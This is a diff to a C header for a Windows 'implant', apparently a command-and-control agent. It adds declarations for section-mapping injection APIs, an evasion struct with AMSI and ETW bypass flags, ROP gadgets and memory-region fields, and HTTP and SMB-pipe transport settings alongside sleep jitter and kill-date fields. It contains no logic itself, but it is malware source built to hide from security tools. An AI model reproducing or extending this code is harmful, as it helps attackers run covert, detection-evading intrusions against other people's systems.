@@ -30,12 +30,6 @@ typedef struct _INSTANCE {
 
     PTEB Teb;
 
-    //
-    // base address and size
-    // of the implant
-    //
-    BUFFER Base;
-
     struct {
         WINBOOL (WINAPI *VirtualFreeEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
         BOOL    (WINAPI *CreatePipe)(PHANDLE hReadPipe, PHANDLE hWritePipe, LPSECURITY_ATTRIBUTES lpPipeAttributes, DWORD nSize);
@@ -130,6 +124,9 @@ typedef struct _INSTANCE {
         NTSTATUS (NTAPI *NtQueryInformationFile)(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass);
         NTSTATUS (NTAPI *NtSetInformationVirtualMemory)(HANDLE ProcessHandle, VIRTUAL_MEMORY_INFORMATION_CLASS VmInformationClass, ULONG_PTR NumberOfEntries, PMEMORY_RANGE_ENTRY VirtualAddresses, PVOID VmInformation, ULONG VmInformationLength);
 
+        NTSTATUS (NTAPI *NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
+        NTSTATUS (NTAPI *NtMapViewOfSection)(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, SECTION_INHERIT InheritDisposition, ULONG AllocationType, ULONG Win32Protect);
+        NTSTATUS (NTAPI *NtCreateSection)(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle);
         NTSTATUS (NTAPI *NtOpenProcess)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
         NTSTATUS (NTAPI *NtWaitForSingleObject)(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);
         NTSTATUS (NTAPI *NtSignalAndWaitForSingleObject)(HANDLE SignalHandle, HANDLE WaitHandle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);
@@ -183,9 +180,18 @@ typedef struct _INSTANCE {
     } Win32;
 
     struct {
+        BUFFER Region;
+        BUFFER RxRegion;
+        BUFFER RwRegion;
         PVOID  Backup;
-        UINT64 Length;
-    } *StompArgs;
+        PVOID  StackBase;
+        PVOID  StackLimit;
+        BOOL   AmsiBypass;
+        BOOL   EtwBypass;
+        PVOID  Heap;
+        GADGET Gadgets;
+        FORK   Fork;
+    } Blackout;
 
     struct {
         PVOID Ntdll;
@@ -200,19 +206,18 @@ typedef struct _INSTANCE {
         PVOID Cryptsp;
     } Modules;
 
-    struct {
-        PSTR  Spawnto;
-        DWORD Ppid;
-        BOOL  Blockdlls;
-        PWSTR Argue;            
-    } Fork;
-
     struct {   
-        LPWSTR   UserAgent;
-        LPWSTR   Host;
-        DWORD    Port;
-        PPACKAGE Package;
-        BOOL     Secure;
+        struct {
+            LPWSTR   UserAgent;
+            LPWSTR   Host;
+            DWORD    Port;
+            PPACKAGE Package;
+            BOOL     Secure;
+        } Http;
+
+        struct {
+            PSTR PipeName;
+        } Smb;
     } Transport;
     
     struct {
@@ -229,16 +234,10 @@ typedef struct _INSTANCE {
         DWORD  ParentProcId;
         DWORD  ProcessId;
         DWORD  ThreadId;
-        PVOID  Heap;
-        DWORD  SleepObf;
         DWORD  SleepTime;
         DWORD  Jitter;
-        BOOL   AmsiBypass;
-        BOOL   EtwBypass;
         UINT64 KillDate;
         UINT32 WorkingHours;
-        PVOID  StackBase;
-        PVOID  StackLimit;
     } Session;
 
     struct {
